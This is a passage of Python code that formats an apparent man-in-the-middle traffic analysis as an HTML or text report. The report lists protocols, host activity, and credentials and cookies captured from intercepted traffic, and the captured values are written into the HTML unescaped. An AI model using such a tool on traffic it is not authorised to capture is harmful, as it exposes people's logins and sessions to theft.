    </table>
    
    <h2>Protocol Distribution</h2>
    <table>
        <tr>
            <th>Protocol</th>
            <th>Frames</th>
            <th>Bytes</th>
        </tr>
"""
            
            # Add protocols
            for protocol, stats in analysis.get('protocols', {}).items():
                html += f"""
        <tr>
            <td>{protocol}</td>
            <td>{stats.get('frames', '0')}</td>
            <td>{stats.get('bytes', '0')}</td>
        </tr>"""
            
            html += """
    </table>
    
    <h2>Host Activity</h2>
    <table>
        <tr>
            <th>IP Address</th>
            <th>TX Frames</th>
            <th>TX Bytes</th>
            <th>RX Frames</th>
            <th>RX Bytes</th>
        </tr>
"""
            
            # Add hosts
            for ip, stats in analysis.get('hosts', {}).items():
                html += f"""
        <tr>
            <td>{ip}</td>
            <td>{stats.get('tx_frames', '0')}</td>
            <td>{stats.get('tx_bytes', '0')}</td>
            <td>{stats.get('rx_frames', '0')}</td>
            <td>{stats.get('rx_bytes', '0')}</td>
        </tr>"""
            
            html += """
    </table>
"""
            
            # Add credentials if found
            if analysis.get('credentials'):
                html += """
    <h2 class="danger">Potential Credentials Found</h2>
    <table>
        <tr>
            <th>Host</th>
            <th>URI</th>
            <th>Data</th>
        </tr>
"""
                
                for cred in analysis.get('credentials', []):
                    html += f"""
        <tr>
            <td>{cred.get('host', '')}</td>
            <td>{cred.get('uri', '')}</td>
            <td>{cred.get('data', '')}</td>
        </tr>"""
                
                html += """
    </table>
"""
            
            # Add cookies if found
            if analysis.get('cookies'):
                html += """
    <h2 class="warning">Cookies Found</h2>
    <table>
        <tr>
            <th>Host</th>
            <th>Cookie</th>
        </tr>
"""
                
                for cookie in analysis.get('cookies', []):
                    html += f"""
        <tr>
            <td>{cookie.get('host', '')}</td>
            <td>{cookie.get('cookie', '')}</td>
        </tr>"""
                
                html += """
    </table>
"""
            
            html += """
</body>
</html>
"""
            return html
            
        else:  # Default to text format
            # Generate text report
            report = f"MITM Attack Analysis Report\n"
            report += f"Generated: {analysis.get('timestamp', 'Unknown')}\n"
            report += f"File: {analysis.get('file', 'Unknown')}\n\n"
            
            report += f"Capture Statistics\n"
            report += f"------------------\n"
            for key, value in analysis.get('statistics', {}).items():
                report += f"{key}: {value}\n"
            
            report += f"\nProtocol Distribution\n"
            report += f"---------------------\n"
            report += f"{'Protocol':<30} {'Frames':<10} {'Bytes':<10}\n"
            for protocol, stats in analysis.get('protocols', {}).items():
                report += f"{protocol:<30} {stats.get('frames', '0'):<10} {stats.get('bytes', '0'):<10}\n"
            
            report += f"\nHost Activity\n"
            report += f"-------------\n"
            report += f"{'IP Address':<15} {'TX Frames':<10} {'TX Bytes':<10} {'RX Frames':<10} {'RX Bytes':<10}\n"
            for ip, stats in analysis.get('hosts', {}).items():
                report += f"{ip:<15} {stats.get('tx_frames', '0'):<10} {stats.get('tx_bytes', '0'):<10} {stats.get('rx_frames', '0'):<10} {stats.get('rx_bytes', '0'):<10}\n"
            
            if analysis.get('credentials'):
                report += f"\n!!! Potential Credentials Found !!!\n"
                report += f"--------------------------------\n"
                for cred in analysis.get('credentials', []):
                    report += f"Host: {cred.get('host', '')}\n"
                    report += f"URI: {cred.get('uri', '')}\n"
                    report += f"Data: {cred.get('data', '')}\n\n"
            
            if analysis.get('cookies'):
                report += f"\nCookies Found\n"
                report += f"-------------\n"
                for cookie in analysis.get('cookies', []):
                    report += f"Host: {cookie.get('host', '')}\n"
                    report += f"Cookie: {cookie.get('cookie', '')}\n\n"
            
            return report